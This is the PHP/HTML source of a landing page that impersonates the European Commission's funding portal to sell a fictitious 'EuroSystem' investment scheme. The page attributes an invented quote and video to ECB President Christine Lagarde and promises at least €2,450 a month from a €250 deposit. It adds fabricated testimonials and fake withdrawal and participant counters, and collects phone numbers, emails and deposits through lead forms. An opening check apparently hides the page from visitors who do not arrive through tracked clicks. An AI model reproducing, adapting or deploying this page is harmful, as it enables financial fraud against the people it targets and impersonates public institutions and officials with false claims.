<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>
<?php

include_once dirname(__FILE__) . '/config.php';

?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>European Commission</title>
    <link
      rel="stylesheet"
      href="ajax/libs/modern-normalize/2.0.0/modern-normalize.min.css"
      integrity="sha512-4xo8blKMVCiXpTaLzQSLSw3KFOVPWhm/TRtuPVc4WG6kUgjH6J03IBuG7JZPkcWMxJ5huwaBpOpnwYElP/m6wg=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link
      rel="stylesheet"
      href="ajax/libs/font-awesome/6.6.0/css/all.min.css"
      integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link
      rel="stylesheet"
      href="lander/european-comision_1722861699/css/main.css"
    />
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">

    <style>
      .checkbox-wrap.valid {
        display: none;
      }
    </style>

    <script src="jquery-3.6.1.min.js"></script>
    <script src="form/js/libs/intlTelInput.js"></script>

    <script src="form/js/libs/jquery.maskedinput.js"></script>
    <script src="form/js/libs/utils.js"></script>

    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>

    <!--PIXEL DEFENCE-->
    <?php if($FacebookPixel): ?>
    <script type="application/javascript">
      !(function (f, b, e, v, n, t, s) {
        if (f.fbq) return;
        n = f.fbq = function () {
          n.callMethod
            ? n.callMethod.apply(n, arguments)
            : n.queue.push(arguments);
        };
        if (!f._fbq) f._fbq = n;
        n.push = n;
        n.loaded = !0;
        n.version = "2.0";
        n.queue = [];
        t = b.createElement(e);
        t.async = !0;
        t.src = v;
        s = b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t, s);
      })(
        window,
        document,
        "script",
        "https://connect.facebook.net/en_US/fbevents.js"
      );
      fbq("init", "<?=$FacebookPixel ?>");
      fbq("track", "PageView");
    </script>
    <?php endif; ?>
  </head>

  <body>
    <div class="priloader">
      <div class="lds-roller">
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
      </div>
    </div>
    <header class="header">
      <div class="header-top">
        <div class="logo-box">
          <img
            class="header-logo"
            src="lander/european-comision_1722861699/img/logo-ec--en.svg.png"
            alt="ENEOS"
            width="100%"
          />
          <h3>EU Funding & Programmes Portal</h3>
        </div>
        <div class="reg-box">
          <a href="#leadform1">Register</a>
          <img
            src="lander/european-comision_1722861699/img/eui-language-selectorButton.png"
            alt=""
          />
        </div>
      </div>
      <div class="header-box">
        <nav>
          <ul class="header-links">
            <li>
              <a class="header-link" href="#leadform2">
                <i class="fa-solid fa-house"></i>
                Home
              </a>
            </li>
            <li>
              <a class="header-link" href="#leadform2">
                Funding
                <i class="fa-solid fa-caret-down"></i>
              </a>
            </li>
            <li>
              <a class="header-link" href="#leadform2">
                Procurement
                <i class="fa-solid fa-caret-down"></i>
              </a>
            </li>
            <li>
              <a class="header-link" href="#leadform2">
                Projects & results
                <i class="fa-solid fa-caret-down"></i>
              </a>
            </li>
            <li>
              <a class="header-link" href="#leadform2">
                Events
                <i class="fa-solid fa-caret-down"></i>
              </a>
            </li>
            <li>
              <a class="header-link" href="#leadform2">
                Work as an expert
                <i class="fa-solid fa-caret-down"></i>
              </a>
            </li>
            <li>
              <a class="header-link" href="#leadform2">
                Guidance
                <i class="fa-solid fa-caret-down"></i>
              </a>
            </li>
          </ul>
        </nav>
      </div>
      <div class="header-sub">
        <nav>
          <ul class="sub-links">
            <li>
              <a class="sub-link akcent-link" href="#leadform2"
                >Home <i class="fa-solid fa-angle-right"></i
              ></a>
            </li>
            <li>
              <a class="sub-link akcent-link" href="#leadform2"
                >Funding <i class="fa-solid fa-angle-right"></i
              ></a>
            </li>
            <li>
              <a class="sub-link akcent-link" href="#leadform2"
                >EU programmes <i class="fa-solid fa-angle-right"></i
              ></a>
            </li>
            <li>
              <a class="sub-link" href="#leadform2">EuroSystem Programme</a>
            </li>
          </ul>
        </nav>
      </div>
      <div class="mobile-header">EU F&T Portal</div>
    </header>
    <section class="hero">
      <h1>
        Investment project to provide assistance to the citizens of Europe
      </h1>
      <div class="container">
        <div class="hero-wrapper">
          <div class="hero-video">
            <h2>
              Statement by the President of the Central Bank Christine Lagarde
            </h2>
            <video
              src="lander/european-comision_1722861699/vveennna.mp4"
              preload=""
              muted=""
              autoplay=""
              controls=""
              controlslist="nodownload"
            ></video>
          </div>
          <div class="hero-form">
            <div
              id="leadform1"
              style="
                width: 100%;
                display: flex;
                flex-direction: column;
                gap: 15px;
                align-items: center;
                background: var(--main-color);
                padding: 40px 30px;
              "
            >
              <p style="text-align: center; color: white">
                REGISTER IN EU PROGRAMME <br />
                “EUROSYSTEM”
              </p>
              <div class="app" id="app1" data-type="2">
                <form
                  autocomplete="off"
                  class="form _main-form register-form form-reg form-send"
                  method="post"
                  id="main-form"
                ></form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <section class="profit">
      <div class="container">
        <div class="profit-block">
          <div class="sum-box">
            <h2 class="count" data-max="2450">€0</h2>
            <p>Minimal Monthly Profit</p>
          </div>
          <div class="sum-box">
            <h2 class="count" data-max="98799">0</h2>
            <p>Participants in EU</p>
          </div>
          <div class="sum-box">
            <h2 class="count" data-max="249">€0</h2>
            <p>Minimal investment</p>
          </div>
        </div>
      </div>
    </section>
    <section class="president">
      <div class="container">
        <div class="president-block">
          <div class="president-text">
            <h3>
              EuroSystem - affordable passive <br />
              income for every European citizen.
            </h3>
            <!-- <p>EUROSYSTEM is a European program for the development of the European economy, which
            provides
            every European citizen with the opportunity to receive passive income from the EU budget.
            The program is aimed at the development of the European economy, the creation of new jobs and
            the
            development of small and medium-sized businesses. The program is based on the principle of
            "one
            euro - one euro", which means that every euro invested in the program will be returned to the
            investor
            with a profit of 1 euro. The program is open to all European citizens, regardless of
            nationality,
            age, gender, religion, political views and other factors. The program is aimed at the
            development
            of the European economy, the creation of new jobs and the development of small and medium-sized
            businesses. The program is based on the principle of "one euro - one euro", which means
            that every
            euro invested in the program will be returned to the investor with a profit of 1 euro.
            </p> -->
            <p>
              EuroSystem is a unique opportunity for every European citizen to
              get a stable passive income. <br />Thanks to our platform, even
              minimal investments can bring significant returns - with an
              investment of just 250 euros you will earn a monthly income of at
              least 2,450 euros. <br />As Christine Lagarde, President of the
              European Central Bank (ECB), said in a recent speech: <br />
              <i>
                "After Digital Euro, EuroSystem is a breakthrough in financial
                technology. It is important to us that EU citizens do not feel
                the brunt of inflation"
              </i>
            </p>
          </div>
          <div class="president-img">
            <img
              src="lander/european-comision_1722861699/img/president.png"
              alt=""
            />
            <p>ECB President Christine Lagarde</p>
          </div>
        </div>
      </div>
    </section>
    <section class="functionality">
      <div class="container">
        <div class="functionality-block">
          <div class="functionality-text">
            <div class="div1">
              <p>
                Initial investment: You deposit an initial capital of €250 into
                your EuroSystems account.
              </p>
            </div>
            <div class="div2">
              <p>
                Our team of Europe's best investment analysts develop and
                implement effective strategies in the financial markets by
                analysing current trends and forecasts.
              </p>
            </div>
          </div>
          <div class="div3">
            <h3>How EuroSystem works?</h3>
            <p>A step-by-step process for generating revenue</p>
          </div>
          <div class="functionality-text">
            <div class="div4">
              <p>
                EuroSystem's advanced software automatically copies only
                successful analyst trades to your account. Thanks to this, you
                receive a stable monthly income. The average income is 2400
                euros per month, which is much higher than an initial
                investment.
              </p>
            </div>
            <div class="div5">
              <p>
                There are no commissions for the first three months for new
                members, allowing you to maximise all the benefits of the
                platform and make high profits at no extra cost.
              </p>
            </div>
          </div>
        </div>
      </div>
    </section>
    <section class="withdraw">
      <div class="container">
        <div class="withdraw-block">
          <div class="img-box">
            <p>Withdraw Your Funds With:</p>
            <img
              src="lander/european-comision_1722861699/img/withdraw.png"
              alt=""
            />
          </div>

          <div class="table" style="background-color: #1f2938">
            <h2 style="color: #fff; text-align: center; margin-bottom: 30px">
              Real-time Withdrawals
            </h2>
            <div class="table-responsive">
              <table class="table__table">
                <thead>
                  <tr>
                    <th>Asset</th>
                    <th>Direction</th>
                    <th>Amount</th>
                    <th>Opening time</th>
                    <th>Expiry time</th>
                    <th>Status</th>
                    <th>Payment</th>
                  </tr>
                </thead>
                <tbody class="table__body"></tbody>
              </table>
            </div>
          </div>
        </div>
      </div>
      <style>
        .table {
          padding: 40px 20px;
        }

        @media (max-width: 650px) {
          .table {
            padding: 30px 20px;
          }
        }

        .table__title {
          color: #316de5;
          text-align: center;
          font-family: "Roboto";
          font-weight: 700;
          margin: 0 auto;
          margin-bottom: 70px;
        }

        @media (max-width: 650px) {
          .table__title {
            margin-bottom: 30px;
          }
        }

        .table-responsive {
          margin: 0 auto;
        }

        @media (max-width: 950px) {
          .table-responsive {
            overflow-x: scroll;
          }
        }

        .table__table {
          background: #1f2938;
          text-align: center;
          margin: 0 auto;
        }

        .table__table thead {
          border-bottom: 0.5px solid rgba(0, 0, 0, 0.6);
        }

        .table__table th {
          font-size: 12px;
          font-style: normal;
          font-weight: 500;
          line-height: 18px;
          padding: 12px 32px;
          color: #fff;
        }

        .table__table th:nth-child(4) {
          padding: 12px 60px;
          color: #fff;
        }

        .table__table th:nth-child(5) {
          padding: 12px 65px;
        }

        .table__table tbody tr:nth-child(odd) {
          background: #d4d4d43b;
        }

        .table__table td {
          padding: 5px 5px;
          color: #fff;
        }
        #leadform2 {
          max-width: 500px;
          margin: 0 auto;
        }
      </style>
    </section>
    <section class="reviews">
      <div class="container">
        <h3>what the project participants say</h3>
        <div class="reviews-block">
          <div class="reviews-slider">
            <div class="reviews-slider__item">
              <div class="review-slider__sum">
                <p>Investment - <b>€250</b></p>
                <p>In 1 week - <b>€550</b></p>
                <p>In 1 month - <b>€2340</b></p>
              </div>
              <div class="reviews-slider__item-img">
                <img
                  src="lander/european-comision_1722861699/img/avatar1.png.png"
                  alt="review-1"
                />
                <p><b>Avery</b></p>
                <p>40 years, Manchester</p>
              </div>
              <div class="reviews-slider__item-text">
                <i class="fa-solid fa-quote-left"></i>
                <p>
                  I couldn't believe it at first, but investing in Euro System
                  turned out to be a game-changer for me! With the right
                  research and patience, I managed to make a substantial profit.
                  It's best venture, the potential rewards are worth it!
                </p>
                <i class="fa-solid fa-quote-right" style="margin-left: 95%"></i>
              </div>
            </div>
            <div class="reviews-slider__item">
              <div class="review-slider__sum">
                <p>Investment - <b>€2500</b></p>
                <p>In 1 week - <b>€5340</b></p>
                <p>In 1 month - <b>€24120</b></p>
              </div>
              <div class="reviews-slider__item-img">
                <img
                  src="lander/european-comision_1722861699/img/avatar2.png.png"
                  alt="review-1"
                />
                <p><b>Hailee</b></p>
                <p>36 years, London</p>
              </div>
              <div class="reviews-slider__item-text">
                <i class="fa-solid fa-quote-left"></i>
                <p>
                  Euro System is an exciting journey. It was really awesome!!! I
                  made €5488 in one week, i really don’t know what to say. I
                  can't believe how easy it was to make a fortune with Euro
                  System!
                </p>
                <i class="fa-solid fa-quote-right" style="margin-left: 95%"></i>
              </div>
            </div>
            <div class="reviews-slider__item">
              <div class="review-slider__sum">
                <p>Investment - <b>€800</b></p>
                <p>In 1 week - <b>€1510</b></p>
                <p>In 1 month - <b>€6220</b></p>
              </div>
              <div class="reviews-slider__item-img">
                <img
                  src="lander/european-comision_1722861699/img/avatar3.png.png"
                  alt="review-1"
                />
                <p><b>Marcus</b></p>
                <p>54 years, Brighton</p>
              </div>
              <div class="reviews-slider__item-text">
                <i class="fa-solid fa-quote-left"></i>
                <p>
                  I used a unique Euro System that helped me made a lot of money
                  in short term. It was almost like a money-making machine! If
                  such a system had appeared earlier, I would already be a
                  millionaire. But now I have the opportunity to pay for my
                  children's education
                </p>
                <i class="fa-solid fa-quote-right" style="margin-left: 95%"></i>
              </div>
            </div>
            <div class="reviews-slider__item">
              <div class="review-slider__sum">
                <p>Investment - <b>€250</b></p>
                <p>In 1 week - <b>€612</b></p>
                <p>In 1 month - <b>€2320</b></p>
              </div>
              <div class="reviews-slider__item-img">
                <img
                  src="lander/european-comision_1722861699/img/avatar4.png.png"
                  alt="review-1"
                />
                <p><b>Jack</b></p>
                <p>60 years, Watford</p>
              </div>
              <div class="reviews-slider__item-text">
                <p>
                  <i class="fa-solid fa-quote-left"></i>
                  I can't even believe that I was able to earn so much money in
                  such a short period of time. It's incredible, they showed up
                  at the exact moment I needed them. Now I can buy a car and pay
                  off all my debts. And that's just in a week
                  <i
                    class="fa-solid fa-quote-right"
                    style="margin-left: 95%"
                  ></i>
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <section class="start">
      <div class="container">
        <h3>How to start earning with EuroSystem</h3>
        <div class="start__inner">
          <div class="start__inner-item">
            <div class="start__inner-item-img">
              <img
                src="lander/european-comision_1722861699/img/step1.svg%20fill.svg"
                alt="1"
              />
              <p>Register</p>
            </div>
            <p>
              Enter your phone and mail. Fill in your registration information.
              Read the Rules and click "Register"
            </p>
          </div>
          <div class="start__inner-item">
            <div class="start__inner-item-img">
              <img
                src="lander/european-comision_1722861699/img/step2.svg%20fill.png"
                alt="1"
              />
              <p>Deposit</p>
            </div>
            <p>
              Select any payment system and make a start deposit €250 in your
              personal account
            </p>
          </div>
          <div class="start__inner-item">
            <div class="start__inner-item-img">
              <img
                src="lander/european-comision_1722861699/img/step3.svg%20fill.svg"
                alt="1"
              />
              <p>Profit</p>
            </div>
            <p>
              You can monitor your profit from your account. You can also manage
              your profits and make new deposits
            </p>
          </div>
          <div class="start__inner-item">
            <div class="start__inner-item-img">
              <img
                src="lander/european-comision_1722861699/img/step4.svg.svg"
                alt="1"
              />
              <p>Withdraw</p>
            </div>
            <p>
              Do not forget to specify the details of an bank card in the
              settings of personal account to which you want to transfer money.
            </p>
          </div>
        </div>
      </div>
    </section>
    <section class="registration">
      <div class="container">
        <div class="registrstion-block">
          <h3>
            Register and see the first results <br />
            the very next day
          </h3>
          <div class="registration-form">
            <div id="leadform2">
              <div class="app" id="app1" data-type="2">
                <form
                  autocomplete="off"
                  class="form _main-form register-form form-reg form-send"
                  method="post"
                  id="main-form"
                ></form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <section class="share">
      <div class="share-block">
        <p>Share this page</p>
        <div class="share-block__inner">
          <div class="share-box">
            <i class="fa-brands fa-x-twitter"></i>
            <p>X</p>
          </div>
          <div class="share-box">
            <i class="fa-brands fa-facebook" style="color: #1877f2"></i>
            <p>Facebook</p>
          </div>
          <div class="share-box">
            <i class="fa-brands fa-linkedin" style="color: #0a66c2"></i>
            <p>Linkedin</p>
          </div>
          <div class="share-box">
            <i class="fa-brands fa-telegram" style="color: #27a6e6"></i>
            <p>Telegram</p>
          </div>
        </div>
      </div>
    </section>
    <footer class="footer">
      <div class="footer-block">
        <div class="footer-block__inner">
          <div class="footer-block__1">
            <p style="font-weight: 500">EU Funding & Tenders Portal</p>
            <p style="font-weight: 500">
              Single Electronic Data Interchange Area (SEDIA)
            </p>
            <p style="font-weight: 200">
              This site is managed by: Directorate-General for Research and
              Innovation
            </p>
            <p style="font-weight: 300">Accessibility</p>
            <p style="font-weight: 300">Webpage banner copyright information</p>
          </div>
          <div class="footer-block__2">
            <div class="text-box">
              <p>Contact us</p>
              <div class="line"></div>
              <p>IT Helpdesk</p>
            </div>
            <div class="text-box">
              <p>Follow us on</p>
              <div class="line"></div>
              <div class="social-box">
                <p><i class="fa-brands fa-facebook"></i> Facebook</p>
                <p><i class="fa-brands fa-x-twitter"></i> X</p>
                <p><i class="fa-brands fa-linkedin"></i> Linkedin</p>
              </div>
            </div>
          </div>
          <div class="footer-block__3">
            <div class="footer-block__3-1">
              <p style="font-weight: 500">About us</p>
              <div class="line"></div>
              <p>Information about the EU Funding & Tenders Portal</p>
            </div>
            <div class="footer-block__3-2">
              <p style="font-weight: 500">Related links</p>
              <div class="line"></div>
              <p>Calls for tenders on Ted</p>
              <p>Overview of all EU funding opportunities</p>
              <p>Access to publications and data on OpenAIRE</p>
              <p>Apply for EU loans & venture capital</p>
              <p>Find funding in the EU Macro-Regions</p>
              <p>Public in Open Research Europe(Open Access)</p>
              <p>
                Public list of entities excluded or subject to financial penalty
                - EDES Database
              </p>
            </div>
          </div>
        </div>
        <div class="footer-block__inner-bottom">
          <div class="footer-block__logo">
            <img
              src="lander/european-comision_1722861699/img/Picturelogo-ec--en.svg.svg"
              alt=""
            />
          </div>
          <div class="footer-block__text">
            <p>Contact the European Commission</p>
            <p>Follow the European Commission on social media</p>
            <p>Resources for partners</p>
          </div>
          <div class="footer-block__social">
            <div class="footer-block__social-box">
              <p>Languages on our websites</p>
              <p>Cookies</p>
              <p>Legal notice</p>
            </div>
          </div>
        </div>
      </div>
    </footer>

    <script src="lander/european-comision_1722861699/table.js"></script>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const counters = document.querySelectorAll(".count");
        const speed = 200; // The lower the slower

        counters.forEach((counter) => {
          const animate = () => {
            const value = +counter.getAttribute("data-max");
            const data = +counter.innerText.replace(/[^0-9]/g, "");
            const increment = value / speed;

            if (data < value) {
              counter.innerText = counter.innerText.includes("€")
                ? `€${Math.ceil(data + increment).toLocaleString()}`
                : Math.ceil(data + increment).toLocaleString();
              setTimeout(animate, 1);
            } else {
              counter.innerText = counter.innerText.includes("€")
                ? `€${value.toLocaleString()}`
                : value.toLocaleString();
            }
          };

          animate();
        });
      });
    </script>

    <script>
      $("a[href^='#']").on("click", function () {
        let href = $(this).attr("href");

        $("html, body").animate({
          scrollTop: $(href).offset().top,
        });

        return false;
      });
    </script>

    <script src="loadAssets.js?v=4564"></script>

    <script>
      const scrollToElement = (elSelector, triggerSelector) => {
        const el = document.querySelector(elSelector);
        const triggers = document.querySelectorAll(triggerSelector);

        const callback = (item) => {
          item.addEventListener("click", (event) => {
            event.preventDefault();

            el.scrollIntoView({
              behavior: "smooth",
              block: "center",
            });
          });
        };
        triggers.forEach(callback);
      };
      scrollToElement("#main-form", 'a[href="#main-form"]');
      scrollToElement("#leadform1", 'a[href="leadform1"]');
      scrollToElement("#leadform2", 'a[href="leadform2"]');
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>

    <script>
      window.onload = function () {
        var thx = localStorage.getItem("thanks");
        if (thx && thx === "true") {
          const fileThx = "confirm.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };

      window.onpageshow = function () {
        var thx = localStorage.getItem("thanks");
        if (thx && thx === "true") {
          const fileThx = "confirm.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };
    </script>
  </body>
</html>
